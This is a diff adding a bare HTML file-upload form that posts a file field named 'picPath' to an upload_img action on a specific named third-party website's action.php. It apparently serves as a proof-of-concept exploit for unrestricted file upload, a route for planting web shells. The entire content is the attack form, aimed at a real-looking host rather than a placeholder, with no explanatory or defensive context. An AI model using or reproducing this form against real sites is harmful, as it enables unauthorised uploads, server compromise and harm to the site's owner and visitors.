@@ -1,0 +1,9 @@
+
+<html>
+<form method=post action="http://303project.feeltan.com.au/action.php?action=upload_img&url=index.php" enctype="multipart/form-data">
+
+<input type=file name="picPath" id="picPath" />
+<br />
+<input type=submit />
+
+</form>
